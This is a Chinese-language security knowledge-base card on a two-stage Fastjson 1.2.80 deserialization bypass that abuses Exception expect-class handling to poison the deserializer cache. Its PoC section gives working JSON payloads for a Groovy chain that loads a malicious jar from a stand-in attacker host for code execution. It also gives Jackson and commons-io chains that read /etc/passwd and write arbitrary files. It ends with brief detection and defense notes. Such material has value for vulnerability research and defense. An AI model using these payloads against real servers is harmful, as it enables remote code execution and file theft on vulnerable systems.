---
id: web-java-deser-fastjson-1280-exception-deserializer-cache-bypass
title: Fastjson 1.2.80 Exception 期望类 + 反序列化器缓存两段式绕过：Groovy/Jackson/IO 链
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-1280-deserializer-cache-bypass
tags:
- java
- fastjson
- deserialization
- autotype
- expectclass
- throwable
- cache-poisoning
- groovy
- jackson
- commons-io
cve: []
severity: critical
confidence: high
status: draft
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: fastjson 1.2.80（原文实测；groovy 链 1.2.76 <= fastjson < 1.2.83，jackson+io 链 1.2.75 < fastjson <= 1.2.80）
url: /docs/web/java/deserialization/fastjson/web-java-deser-fastjson-1280-exception-deserializer-cache-bypass/
draft: false
kb_aliases:
- fastjson 1.2.80 绕过
- Exception 期望类
- ThrowableDeserializer 缓存
- deserializers.findClass 绕过
- fastjson 1.2.80 groovy
- fastjson 1.2.80 jackson io
- 两段式 fastjson
---

## 一句话结论

Fastjson 1.2.80 把 `java.lang.Exception` 当作期望类后，`ThrowableDeserializer` 会把对象里的其他字段按声明类型做 `TypeUtils.cast`，该过程调用 `ParserConfig.getDeserializer` 并把类型和反序列化器放进 `deserializers` 缓存；`checkAutoType` 在黑白名单检查前会先查这个缓存，于是第一段请求“投毒”缓存，第二段请求就能加载缓存中的类并触发 Groovy/Jackson/IO 等链。

## 原理

1.2.80 的绕过分两段：

**第一段：把类塞进 `deserializers` 缓存。**
`{"@type":"java.lang.Exception","@type":"<某 Throwable 子类>","<field>":{}}` 中第一个 `@type` 作为期望类 `Exception`，第二个 `@type` 是实际类型，必须是 `Exception` 子类才通过 `expectClass.isAssignableFrom`。进入 `ThrowableDeserializer.deserialize` 后遍历其他键值：

```java
if (!fieldInfo.fieldClass.isInstance(value)) {
    value = TypeUtils.cast(value, fieldInfo.fieldType, parser.getConfig());
}
```

`value` 是 `{}`（JSONObject），与字段声明类型不匹配，`cast` 会调用 `config.getDeserializer(fieldType)`；`getDeserializer` 结尾执行 `putDeserializer(type, deserializer)`，把该字段类型及其反序列化器写入缓存。

**第二段：从缓存加载。**
`ParserConfig.checkAutoType` 开头：

```java
clazz = TypeUtils.getClassFromMapping(typeName);
if (clazz == null) {
    clazz = deserializers.findClass(typeName);
}
```

`deserializers.findClass` 命中后，后续 AutoType/黑名单逻辑不会再拒绝该类型。于是第二段可以用缓存中的 `ProcessingUnit` 或 `JsonParser/UTF8StreamJsonParser` 作为 `@type`，再配合子类/字段完成利用。

1.2.80 的修复是在 `checkAutoType` 对“从缓存取出的 Throwable 子类”做判断：当 `expectClass == null`、`clazz` 是 `Throwable` 子类且 `autoTypeSupport=false` 时把 `clazz` 置空。

## 触发条件

- fastjson 1.2.80（或对应受影响区间），SafeMode 关闭；
- 不可信 JSON 可连续发送两次（同一 JVM；缓存跨请求保留）；
- classpath 存在可利用的 Throwable 子类及其字段类型，以及对应 gadget 依赖（Groovy、Jackson、commons-io、JDBC 驱动等）；
- 第二段的类与第一段缓存的类型存在继承/接口关系，能满足期望类校验；
- 远程加载场景需要目标能访问攻击者 HTTP 服务；本地 IO 场景需要文件路径/回显条件。

## 利用步骤

1. 确认 fastjson 版本与解析入口；用无害类型验证两段式缓存是否保留（同一 JVM）；
2. 选择第一段 Throwable 子类：其字段类型应是第二段想用的类（如 Groovy `CompilationFailedException.unit` → `ProcessingUnit`，Jackson `InputCoercionException.p` → `JsonParser`）；
3. 发送第一段，字段值用 `{}` 触发 cast/cache；
4. 发送第二段：以缓存类型为第一个 `@type`（期望类），实际子类为第二个 `@type`，填入触发属性；
5. Groovy 场景把 `classpathList` 指向托管恶意 jar 的 HTTP 地址，jar 内 `META-INF/services/org.codehaus.groovy.transform.ASTTransformation` 写入恶意类名，由 SPI 加载执行；
6. Jackson+io 场景第二段使用 `java.io.InputStream` + `BOMInputStream`/`TeeInputStream`/`LockableFileWriter` 等完成任意文件读写。

## PoC

Groovy（fastjson 1.2.76–1.2.82）：

```json
// 第一段：缓存 ProcessingUnit
{"@type":"java.lang.Exception","@type":"org.codehaus.groovy.control.CompilationFailedException","unit":{}}
```

```json
// 第二段：加载 JavaStubCompilationUnit，classpathList 指向恶意 jar
{"@type":"org.codehaus.groovy.control.ProcessingUnit","@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit","config":{"@type":"org.codehaus.groovy.control.CompilerConfiguration","classpathList":"http://ATTACKER:8090/evil.jar"}}
```

恶意 jar 至少包含：

```text
META-INF/services/org.codehaus.groovy.transform.ASTTransformation
  -> evil.AwesomeScriptEngineFactory
```

Jackson + commons-io（1.2.75 < fastjson <= 1.2.80，需 jackson-core）：

```json
// 第一段：缓存 JsonParser / UTF8StreamJsonParser
{"a":"{\"@type\":\"java.lang.Exception\",\"@type\":\"com.fasterxml.jackson.core.exc.InputCoercionException\",\"p\":{}}","b":{"$ref":"$.a.a"},"c":"{\"@type\":\"com.fasterxml.jackson.core.JsonParser\",\"@type\":\"com.fasterxml.jackson.core.json.UTF8StreamJsonParser\",\"in\":{}}","d":{"$ref":"$.c.c"}}
```

```json
// 第二段：io 读文件
{"a":{"@type":"java.io.InputStream","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"file:///etc/passwd"},"charsetName":"UTF-8","bufferSize":"1024"},"boms":[{"charsetName":"UTF-8","bytes":[<guess>]}]},"boms":[{"charsetName":"UTF-8","bytes":[1]}]},"b":{"$ref":"$.a.delegate"}}
```

```json
// 第二段：io 写文件（结构同 1.2.68 的 ioFinal，改用 java.io.InputStream 期望类）
{"@type":"java.io.InputStream","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.AutoCloseInputStream","in":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String""<bytes>"},"encoder":"iso-8859-1","charset":"iso-8859-1","bufferSize":1},"branch":{"@type":"org.apache.commons.io.output.WriterOutputStream","writer":{"@type":"org.apache.commons.io.output.LockableFileWriter","file":"/tmp/pwn","charset":"iso-8859-1","lockDir":"/tmp/dir","append":false},"charset":"iso-8859-1","bufferSize":1024,"writeImmediately":true},"closeBranch":true}},"include":true,"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"iso-8859-1","bytes":[0,0,0]}],"x":{"$ref":"$.bOM"}}
```

## 变体与关联

- 第一段 Throwable 子类可替换：Groovy 用 `CompilationFailedException.unit`；Jackson 用 `InputCoercionException.p`；PostgreSQL/MySQL 链用 `InputCoercionException` 缓存 InputStream 再套 JDBC；Jython 用 `org.python.antlr.ParseException.type`。
- Groovy 链利用 SPI（`META-INF/services/org.codehaus.groovy.transform.ASTTransformation`），恶意 jar 名可改；文章给出 `javac` + `jar -cvf yaml-payload.jar -C src/ .` 构建方式。
- AspectJ 读文件：`SourceTypeCollisionException` 两段/三段缓存后，用 `BasicCompilationUnit.fileName` 读文件，配合 `java.lang.Character` 报错或 DNS 回显。
- 关联：1.2.68 的 AutoCloseable 期望类绕过是前一代；1.2.83 的资源探测绕过是下一代；本卡机制依赖 `deserializers` 缓存，第二段必须在同一 JVM 且缓存未被清理。

## 检测与防御

- 检测：短时间内同一来源先发 `"@type":"java.lang.Exception"` + Throwable 子类 + `{}` 字段，再发引用 Groovy/Jackson/JDBC 类型的 JSON；请求中出现 `ProcessingUnit`、`JavaStubCompilationUnit`、`CompilerConfiguration`、`classpathList`、`InputCoercionException`、`JsonParser` 等。
- 检测：目标向外部拉取 jar（`classpathList` HTTP）、加载 SPI 服务文件、异常访问 `/tmp` 或 Web 目录。
- 防御：升级 fastjson 到修复版本；开启 SafeMode；对 `@type` 使用 accept 白名单；不要依赖 AutoType 关闭作为唯一防线；限制出网与文件写权限。
- 注意：两段式依赖跨请求缓存，若在网关层做无状态隔离/每次重启 JVM，可降低但不应替代升级。
